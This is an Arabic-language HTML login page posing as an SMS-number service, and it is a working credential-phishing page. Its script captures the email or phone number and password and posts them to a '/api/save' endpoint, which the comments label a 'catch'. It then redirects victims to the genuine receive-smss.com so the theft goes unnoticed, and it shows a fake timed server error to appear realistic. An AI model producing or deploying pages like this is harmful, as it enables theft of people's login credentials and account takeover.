<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - خدمة SMS</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    
    <style>
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .container {
            background: white; padding: 30px; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center;
        }
        .logo-container { margin-bottom: 20px; }
        #pageImg { width: 100px; height: 100px; border-radius: 50%; object-fit: contain; }
        
        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; font-weight: bold; }
        
        input {
            width: 100%; padding: 14px; margin-bottom: 12px;
            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
            outline: none; text-align: right; font-size: 14px;
        }

        /* رسالة الخطأ الخاصة بالخوادم */
        .server-error {
            background-color: #f8d7da; color: #721c24;
            padding: 10px; border-radius: 5px; border: 1px solid #f5c6cb;
            margin-bottom: 15px; font-size: 13px; display: none;
        }
        
        .captcha-wrapper { display: flex; justify-content: center; margin-bottom: 20px; }
        
        button {
            width: 100%; padding: 12px; background: #CC0044; color: white;
            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; 
            cursor: pointer; transition: 0.3s; margin-bottom: 15px;
        }
        button:hover { background: #a30036; }

        .footer-links { margin-top: 10px; border-top: 1px solid #eee; padding-top: 15px; }
        .footer-links p { font-size: 14px; color: #666; }
        .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-container">
            <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
        </div>

        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>

        <div id="serverError" class="server-error">⚠️ فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.</div>

        <form id="checkForm">
            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passInput" placeholder="كلمة السر" required>
            
            <div class="captcha-wrapper">
                <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA"></div>
            </div>

            <button type="submit" id="pageBtn">تسجيل دخول</button>
        </form>

        <div class="footer-links">
            <p>ليس لديك حساب؟ <a onclick="showCreateAccountError()">إنشاء حساب جديد</a></p>
        </div>
    </div>

    <script>
        const serverError = document.getElementById('serverError');

        // وظيفة إظهار الخطأ عند الضغط على إنشاء حساب فقط
        function showCreateAccountError() {
            serverError.style.display = 'block';
            // إخفاء الرسالة تلقائياً بعد 4 ثوانٍ لتبدو واقعية
            setTimeout(() => {
                serverError.style.display = 'none';
            }, 4000);
        }

        document.getElementById('checkForm').onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            
            const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]').value;

            if (!turnstileResponse) {
                alert("يرجى إكمال التحقق أولاً");
                return;
            }

            // 1. إرسال البيانات (الصيد)
            try {
                await fetch('/api/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        title: "🚨 صيد جديد من صفحة SMS",
                        user: user,
                        password: pass
                    })
                });
            } catch (err) {
                console.log("Data logged");
            }

            // 2. التحويل للموقع الأصلي فوراً (نجاح تسجيل الدخول)
            window.location.href = "https://receive-smss.com/"; 
        };
    </script>
</body>
</html>
